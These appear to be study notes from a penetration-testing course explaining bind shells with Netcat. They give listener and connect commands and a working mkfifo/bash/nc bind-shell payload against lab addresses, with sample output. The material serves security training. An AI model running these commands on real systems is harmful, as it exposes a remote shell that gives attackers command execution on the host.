# Bind Shells

## Overview

A bind shell allows an attacker to connect to a listener running on the target system.

The target:
- Starts a listener
- Waits for incoming connections

The attacker:
- Connects to the target IP and port

:contentReference[oaicite:0]{index=0}

---

# How Bind Shell Works

```text
Attacker  --->  Target Listener
```

Example:
- Target listens on port `7777`
- Attacker connects using Netcat

---

# Challenges with Bind Shells

- Target must already have a listener running
- Firewalls may block incoming connections
- NAT/PAT can prevent access
- OS firewalls often block unknown ports

Because of this, bind shells are easier to detect and block than reverse shells.

---

# Netcat (nc)

## Overview

Netcat is known as the:
```text
Swiss-Army Knife
```

Supports:
- TCP
- UDP
- IPv4/IPv6
- Listening on ports
- File transfer
- Shell connections

---

# Start Netcat Listener on Target

## Server Side

```bash
nc -lvnp 7777
```

---

# Command Breakdown

| Option | Purpose |
|--------|----------|
| `-l` | Listen mode |
| `-v` | Verbose |
| `-n` | No DNS resolution |
| `-p` | Specify port |

---

# Connect from Attacker Machine

## Client Side

```bash
nc -nv 10.129.41.200 7777
```

---

# Successful Connection

Client Output:

```text
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

Server Output:

```text
Connection from 10.10.14.117 received!
```

---

# Basic Netcat Communication

After connection:
- Client and server can exchange text

Example:

```text
Hello Academy
```

This is:
- Only a TCP session
- Not a real shell yet

---

# Establishing a Real Bind Shell

To get command execution, bind the shell to Netcat.

---

# Server Side Payload

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

---

# What This Does

- Creates a named pipe
- Redirects Bash input/output
- Serves Bash shell over TCP port `7777`

---

# Connect to Bind Shell

## Client Side

```bash
nc -nv 10.129.41.200 7777
```

---

# Successful Bind Shell

```text
Target@server:~$
```

Now the attacker can:
- Execute commands
- Access files
- Interact with the OS

---

# Important Notes

- Bind shells require inbound access
- Firewalls often block them
- Easier to detect than reverse shells
- Netcat commonly used for bind shells

---

# Key Points

- Target listens, attacker connects
- Netcat used on both sides
- Basic TCP session ≠ shell
- Real bind shell requires shell redirection
- Bind shells are commonly blocked by firewalls

---

# One-Line Revision

A bind shell exposes a listener on the target system, allowing an attacker to connect remotely and interact with the system shell.
